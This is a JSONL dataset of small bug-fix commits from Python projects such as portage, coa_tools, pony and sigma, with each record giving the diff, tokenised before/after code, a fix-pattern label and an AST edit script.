{"project": "Qcodes", "commit_sha": "7706e07eae68e1ef754c058edc09a280f252b6b9", "parent_sha": "12d7c6429bfd6eff6ff85b884e654636c787d10d", "file_path": "qcodes/dataset/plotting.py", "project_url": "https://github.com/jenshnielsen/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ def _make_rescaled_ticks_and_units(data_dict):\n     if unit in _SI_UNITS:\n         maxval = np.nanmax(data_dict['data'])\n \n-        for threshold, scale in _THRESHOLDS:\n+        for threshold, scale in _THRESHOLDS.items():\n             if maxval < threshold:\n                 selected_scale = scale\n                 prefix = _ENGINEERING_PREFIXES[scale]\n", "before": "for threshold , scale in _THRESHOLDS : if maxval < threshold : selected_scale = scale prefix = _ENGINEERING_PREFIXES [ scale ]", "after": "for threshold , scale in _THRESHOLDS . items ( ) : if maxval < threshold : selected_scale = scale prefix = _ENGINEERING_PREFIXES [ scale ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 6, 54], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:_THRESHOLDS\", 3, 33, 3, 44], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "platformio", "commit_sha": "2bce97080917e60d1777c1c8e891f7b4837fdd28", "parent_sha": "ebd2e31efe4a9b87642849a89c44150fcd643238", "file_path": "platformio/util.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/platformio", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ def get_api_result(path, params=None, data=None):\n         raise APIRequestError(\n             \"Could not connect to PlatformIO Registry Service\")\n     except ValueError:\n-        raise APIRequestError(\"Invalid response: %s\" % r.text)\n+        raise APIRequestError(\"Invalid response: %s\" % r.text.encode(\"utf-8\"))\n     finally:\n         if r:\n             r.close()\n", "before": "except ValueError : raise APIRequestError ( \"Invalid response: %s\" % r . text )", "after": "except ValueError : raise APIRequestError ( \"Invalid response: %s\" % r . text . encode ( \"utf-8\" ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 31, 3, 62], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 56, 3, 62], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"utf-8\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "pyinstaller", "commit_sha": "7d75703964852d091fa1f8f222804fec6867333b", "parent_sha": "744ec720679e442446fe638e32701507f4d782a8", "file_path": "Build.py", "project_url": "https://github.com/StarfishStorage/pyinstaller", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ def _save_data(filename, data):\n     outf.close()\n \n def _load_data(filename):\n-    return eval(open(filename, 'r').read())\n+    return eval(open(filename, 'r').read().replace(\"\\r\\n\",\"\\n\"))\n \n def setupUPXFlags():\n     f = os.environ.get(\"UPX\", \"\")\n", "before": "return eval ( open ( filename , 'r' ) . read ( ) )", "after": "return eval ( open ( filename , 'r' ) . read ( ) . replace ( \"\\r\\n\" , \"\\n\" ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 17, 3, 43], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 17, 3, 43], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 17, 3, 43], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:\\\"\\\\r\\\\n\\\"\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:\\\"\\\\n\\\"\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "portage", "commit_sha": "19d71ef90609303586323e4a5c17dc0005838d8c", "parent_sha": "687502c050604b26e4c5e85339a2d9294672fe1f", "file_path": "pym/_emerge/UseFlagDisplay.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ def pkg_use_display(pkg, opts):\n \n \tflag_displays = []\n \tfor varname in var_order:\n-\t\tif varname in use_expand_hidden:\n+\t\tif varname.lower() in use_expand_hidden:\n \t\t\tcontinue\n \t\tflags = []\n \t\tfor f in use_enabled.get(varname, []):\n", "before": "if varname in use_expand_hidden : continue", "after": "if varname . lower ( ) in use_expand_hidden : continue", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 6, 3, 34], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:varname\", 3, 6, 3, 13], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "portage", "commit_sha": "d4b19ee8e8f7039d146ed85af2f264cf9b93dae1", "parent_sha": "0b32a054ea5e30f127addf7246e0f8dfafbab091", "file_path": "pym/_emerge/Binpkg.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -354,7 +354,7 @@ class Binpkg(CompositeTask):\n \t\tos.rename(os.path.join(self.settings[\"D\"],\n \t\t\tself._build_prefix.lstrip(os.sep)), image_tmp_dir)\n \t\tshutil.rmtree(self._image_dir)\n-\t\tensure_dirs(os.path.dirname(self.settings[\"ED\"]))\n+\t\tensure_dirs(os.path.dirname(self.settings[\"ED\"].rstrip(os.sep)))\n \t\tos.rename(image_tmp_dir, self.settings[\"ED\"])\n \n \t\tself.wait()\n", "before": "ensure_dirs ( os . path . dirname ( self . settings [ \"ED\" ] ) )", "after": "ensure_dirs ( os . path . dirname ( self . settings [ \"ED\" ] . rstrip ( os . sep ) ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 51], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 51], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 31, 3, 50], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:rstrip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 50, 3, 51], 2], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:sep\", \"T\"], 2]]"}
{"project": "portage", "commit_sha": "f445747b5d6f8f05efec0f6c3cd8e8c32292c6c2", "parent_sha": "153ca0239f8ab2b6df27810974c7fe0d181acc30", "file_path": "pym/portage/dbapi/vartree.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -631,7 +631,7 @@ class vardbapi(dbapi):\n \t\t\t\tpull_me = set(wants).difference(cache_these)\n \t\t\tmydata.update(metadata)\n \t\telse:\n-\t\t\tpull_me = cache_these\n+\t\t\tpull_me = cache_these.union(wants)\n \n \t\tif pull_me:\n \t\t\t# pull any needed data and cache it\n", "before": "else : pull_me = cache_these", "after": "else : pull_me = cache_these . union ( wants )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 2, 3, 3, 25], [\"call\", \"N0\"], 4], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:cache_these\", 3, 14, 3, 25], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:union\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:wants\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "portage", "commit_sha": "b7cf954ca3c8273343876e9f8e3dd6728c56c52e", "parent_sha": "b4bbc1c2fa1b58dcb4497e35b5d4436c08a054f8", "file_path": "pym/portage/__init__.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6286,7 +6286,7 @@ def _prepare_workdir(mysettings):\n \t\t\twritemsg(\"%s\\n\" % e)\n \t\twritemsg(_(\"!!! Unable to parse PORTAGE_WORKDIR_MODE='%s', using %s.\\n\") % \\\n \t\t(mysettings[\"PORTAGE_WORKDIR_MODE\"], oct(workdir_mode)))\n-\tmysettings[\"PORTAGE_WORKDIR_MODE\"] = oct(workdir_mode)\n+\tmysettings[\"PORTAGE_WORKDIR_MODE\"] = oct(workdir_mode).replace('o', '')\n \ttry:\n \t\tapply_secpass_permissions(mysettings[\"WORKDIR\"],\n \t\tuid=portage_uid, gid=portage_gid, mode=workdir_mode)\n", "before": "mysettings [ \"PORTAGE_WORKDIR_MODE\" ] = oct ( workdir_mode )", "after": "mysettings [ \"PORTAGE_WORKDIR_MODE\" ] = oct ( workdir_mode ) . replace ( 'o' , '' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 39, 3, 56], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 39, 3, 56], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 39, 3, 56], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'o'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:''\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "portage", "commit_sha": "839327edd3653a83b454293c45616de32c944b01", "parent_sha": "676bfd9efb7ea50256d4caa1273e7c40e8f28511", "file_path": "pym/_emerge/Scheduler.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -277,7 +277,7 @@ class Scheduler(PollScheduler):\n \t\tif self._parallel_fetch:\n \t\t\t\t# clear out existing fetch log if it exists\n \t\t\t\ttry:\n-\t\t\t\t\topen(self._fetch_log, 'w')\n+\t\t\t\t\topen(self._fetch_log, 'w').close()\n \t\t\t\texcept EnvironmentError:\n \t\t\t\t\tpass\n \n", "before": "open ( self . _fetch_log , 'w' )", "after": "open ( self . _fetch_log , 'w' ) . close ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 6, 3, 32], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 6, 3, 32], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 6, 3, 32], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:close\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "sigma", "commit_sha": "5053cc4e953a738fcc0ecf664dd006122b9d149c", "parent_sha": "a88b1e81ecc1088c3876620a00fc9d20f616fb24", "file_path": "tools/sigma/parser/condition.py", "project_url": "https://github.com/us3r/sigma", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -295,7 +295,7 @@ class SigmaConditionOptimizer:\n         if type(node) == NodeSubexpression:\n             assert(type(node.items) != list)\n             return self._stripSubexpressionNode(node.items)\n-        if hasattr(node, 'items'):\n+        if hasattr(node, 'items') and type(node) is not ConditionNOT:\n             node.items = list(map(self._stripSubexpressionNode, node.items))\n         return node\n \n", "before": "if hasattr ( node , 'items' ) : node . items = list ( map ( self . _stripSubexpressionNode , node . items ) )", "after": "if hasattr ( node , 'items' ) and type ( node ) is not ConditionNOT : node . items = list ( map ( self . _stripSubexpressionNode , node . items ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 77], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 34], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:ConditionNOT\", \"T\"], 3], [\"Insert\", \"N2\", [\"identifier:type\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:node\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "sigma", "commit_sha": "9f1bbb0a0d56a96e26f7ded525e5662a79046627", "parent_sha": "5dfe39c05b2a8555b2856cc10b206482b407530a", "file_path": "tools/sigma/backends/wdatp.py", "project_url": "https://github.com/us3r/sigma", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class WindowsDefenderATPBackend(SingleTextQueryBackend):\n \n     def default_value_mapping(self, val):\n         op = \"==\"\n-        if \"*\" in val[1:-1]:     # value contains * inside string - use regex match\n+        if type(val) == str and \"*\" in val[1:-1]:     # value contains * inside string - use regex match\n             op = \"matches regex\"\n             val = re.sub('([\".^$]|\\\\\\\\(?![*?]))', '\\\\\\\\\\g<1>', val)\n             val = re.sub('\\\\*', '.*', val)\n", "before": "if \"*\" in val [ 1 : - 1 ] : op = \"matches regex\" val = re . sub ( '([\".^$]|\\\\\\\\(?![*?]))' , '\\\\\\\\\\g<1>' , val ) val = re . sub ( '\\\\*' , '.*' , val )", "after": "if type ( val ) == str and \"*\" in val [ 1 : - 1 ] : op = \"matches regex\" val = re . sub ( '([\".^$]|\\\\\\\\(?![*?]))' , '\\\\\\\\\\g<1>' , val ) val = re . sub ( '\\\\*' , '.*' , val )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 43], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 28], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:str\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:type\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:val\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "coa_tools", "commit_sha": "8e58a1c12720b537e78caaef8dbdb4cb22e5181b", "parent_sha": "af0630a66df7d62a62ec1372a2d158c5ba3c7040", "file_path": "Blender/coa_tools/operators/modal_update.py", "project_url": "https://github.com/tynrare/coa_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class COAModal(bpy.types.Operator):\n                     \r\n                 self.obj_mode_hist = obj.mode\r\n                 \r\n-        if self.check_event_value(event) == \"JUST_PRESSED\" and event.type == \"G\" and active_object.type == \"ARMATURE\" and active_object.mode == \"POSE\":\r\n+        if self.check_event_value(event) == \"JUST_PRESSED\" and active_object != None and event.type == \"G\" and active_object.type == \"ARMATURE\" and active_object.mode == \"POSE\":\r\n             bpy.context.window_manager.coa_update_uv = True\r\n         elif self.check_event_value(event) == \"JUST_RELEASED\" and bpy.context.window_manager.coa_update_uv:  \r\n             bpy.context.window_manager.coa_update_uv = False\r\n", "before": "if self . check_event_value ( event ) == \"JUST_PRESSED\" and event . type == \"G\" and active_object . type == \"ARMATURE\" and active_object . mode == \"POSE\" : bpy . context . window_manager . coa_update_uv = True elif self . check_event_value ( event ) == \"JUST_RELEASED\" and bpy . context . window_manager . coa_update_uv : bpy . context . window_manager . coa_update_uv = False", "after": "if self . check_event_value ( event ) == \"JUST_PRESSED\" and active_object != None and event . type == \"G\" and active_object . type == \"ARMATURE\" and active_object . mode == \"POSE\" : bpy . context . window_manager . coa_update_uv = True elif self . check_event_value ( event ) == \"JUST_RELEASED\" and bpy . context . window_manager . coa_update_uv : bpy . context . window_manager . coa_update_uv = False", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 81], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 81], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 59], 0], [\"Move\", \"N0\", [\"and:and\", 3, 60, 3, 63], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:active_object\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "coa_tools", "commit_sha": "d44f021fb54a1dcab359bf1f8e2533b301210783", "parent_sha": "05d1f9c453be146f7e8285a1a3c6afaf3b729e3a", "file_path": "Blender/coa_tools/operators/edit_mesh.py", "project_url": "https://github.com/tynrare/coa_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -879,7 +879,7 @@ class DrawContour(bpy.types.Operator):\n             if len(select_history) == 0 or self.selected_verts_count != 1:\n                 self.selected_vert_coord = None\n                 self.contour_length = 0\n-            elif len(select_history) > 0 and type(select_history[0]) == bmesh.types.BMVert:\n+            elif len(select_history) > 0 and type(select_history[0]) == bmesh.types.BMVert and event.value not in [\"PRESS\", \"RELEASE\"]:\n                 self.selected_vert_coord = obj.matrix_world* select_history[0].co\n                 if self.contour_length == 0:\n                     self.contour_length = 1\n", "before": "if len ( select_history ) == 0 or self . selected_verts_count != 1 : self . selected_vert_coord = None self . contour_length = 0 elif len ( select_history ) > 0 and type ( select_history [ 0 ] ) == bmesh . types . BMVert : self . selected_vert_coord = obj . matrix_world * select_history [ 0 ] . co if self . contour_length == 0 : self . contour_length = 1", "after": "if len ( select_history ) == 0 or self . selected_verts_count != 1 : self . selected_vert_coord = None self . contour_length = 0 elif len ( select_history ) > 0 and type ( select_history [ 0 ] ) == bmesh . types . BMVert and event . value not in [ \"PRESS\" , \"RELEASE\" ] : self . selected_vert_coord = obj . matrix_world * select_history [ 0 ] . co if self . contour_length == 0 : self . contour_length = 1", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 18, 3, 91], [\"boolean_operator\", 3, 18, 3, 91], 0], [\"Insert\", [\"boolean_operator\", 3, 18, 3, 91], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 18, 3, 91], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N0\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N0\", [\"list\", \"N2\"], 3], [\"Insert\", \"N1\", [\"identifier:event\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:value\", \"T\"], 2], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"PRESS\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:\\\"RELEASE\\\"\", \"T\"], 3], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 4]]"}
{"project": "coa_tools", "commit_sha": "86c00c88a52d9a6bc4c0dfdf9a7743c8fafd43fb", "parent_sha": "dc6ff257e66169368e69bb9ec18ec9684c594187", "file_path": "Blender/coa_tools/operators/edit_shapekey.py", "project_url": "https://github.com/tynrare/coa_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -179,7 +179,7 @@ class EditShapekeyMode(bpy.types.Operator):\n         obj = context.active_object\n         if obj not in self.objs and obj.type == \"MESH\":\n             self.objs.append(obj)\n-        if obj.mode != \"SCULPT\":\n+        if obj.type == \"MESH\" and obj.mode != \"SCULPT\":\n             bpy.ops.object.mode_set(mode=\"SCULPT\")    \n         \n         if obj.type == \"MESH\" and obj.data.shape_keys != None:\n", "before": "if obj . mode != \"SCULPT\" : bpy . ops . object . mode_set ( mode = \"SCULPT\" )", "after": "if obj . type == \"MESH\" and obj . mode != \"SCULPT\" : bpy . ops . object . mode_set ( mode = \"SCULPT\" )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 51], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 32], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"MESH\\\"\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:obj\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:type\", \"T\"], 2]]"}
{"project": "pony", "commit_sha": "f31b796485c6eb3a4295aaeb22771864f1e4817a", "parent_sha": "b73d6b0ced92a7a0af8bc4b8693ef63df4f18b4c", "file_path": "pony/thirdparty/compiler/transformer.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1153,7 +1153,7 @@ class Transformer:\n         # listmaker: test ( list_for | (',' test)* [','] )\n         values = []\n         for i in range(1, len(nodelist)):\n-            if nodelist[i][0] == symbol.list_for:\n+            if PY2 and nodelist[i][0] == symbol.list_for:\n                 assert len(nodelist[i:]) == 1\n                 return self.com_list_comprehension(values[0],\n                                                    nodelist[i])\n", "before": "if nodelist [ i ] [ 0 ] == symbol . list_for : assert len ( nodelist [ i : ] ) == 1 return self . com_list_comprehension ( values [ 0 ] , nodelist [ i ] )", "after": "if PY2 and nodelist [ i ] [ 0 ] == symbol . list_for : assert len ( nodelist [ i : ] ) == 1 return self . com_list_comprehension ( values [ 0 ] , nodelist [ i ] )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 64], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:PY2\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 49], 2]]"}
{"project": "pony", "commit_sha": "423aa0bccf40075b2de0567c7fd6e401b128897b", "parent_sha": "d1fcada9a907efcdfa9cf2bd98b1f626f8cfa559", "file_path": "pony/asttranslation.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -210,7 +210,7 @@ class PreTranslator(ASTTranslator):\n         childs = node.getChildNodes()\n         if childs and all(getattr(child, 'external', False) for child in childs):\n             node.external = True\n-        if node.external:\n+        if node.external and not node.constant:\n             externals = translator.externals\n             externals.difference_update(childs)\n             externals.add(node)\n", "before": "if node . external : externals = translator . externals externals . difference_update ( childs ) externals . add ( node )", "after": "if node . external and not node . constant : externals = translator . externals externals . difference_update ( childs ) externals . add ( node )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 32], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:node\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:constant\", \"T\"], 2]]"}
{"project": "pypugjs", "commit_sha": "21f1cc142c9fb1f19081d3bbbbe3bb51d57fb457", "parent_sha": "894d7bb4325a1055435548d1f59670e712b4a5a4", "file_path": "pypugjs/ext/jinja.py", "project_url": "https://github.com/akubera/pypugjs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -154,7 +154,7 @@ class PyPugJSExtension(Extension):\n             loader = loader.app.jinja_loader\n         except AttributeError:\n             pass\n-        if len(loader.searchpath):\n+        if hasattr(loader, 'searchpath') and len(loader.searchpath):\n             self.options[\"basedir\"] = loader.searchpath[0]\n \n         if not name or (name and not os.path.splitext(name)[1] in self.file_extensions):\n", "before": "if len ( loader . searchpath ) : self . options [ \"basedir\" ] = loader . searchpath [ 0 ]", "after": "if hasattr ( loader , 'searchpath' ) and len ( loader . searchpath ) : self . options [ \"basedir\" ] = loader . searchpath [ 0 ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 59], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 34], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:loader\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'searchpath'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "snafu", "commit_sha": "afba379dcbaccac64c298b71e2b9287957d6767e", "parent_sha": "1a9ef9597643cecec2f204478cad55f6ebdba307", "file_path": "snafu/run_snafu.py", "project_url": "https://github.com/cloud-bulldozer/snafu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def main():\n     es_settings = {}\n     es_settings[\"server\"] = os.getenv(\"es\")\n     es_settings[\"verify_cert\"] = os.getenv(\"es_verify_cert\", \"true\")\n-    if \":443\" in es_settings[\"server\"] :\n+    if es_settings[\"server\"] and \":443\" in es_settings[\"server\"]:\n         es_settings[\"verify_cert\"] = \"false\"\n     if es_settings[\"server\"]:\n         index_args.prefix = os.getenv(\"es_index\", \"\")\n", "before": "if \":443\" in es_settings [ \"server\" ] : es_settings [ \"verify_cert\" ] = \"false\"", "after": "if es_settings [ \"server\" ] and \":443\" in es_settings [ \"server\" ] : es_settings [ \"verify_cert\" ] = \"false\"", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 45], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 39], 2], [\"Insert\", \"N1\", [\"identifier:es_settings\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"server\\\"\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
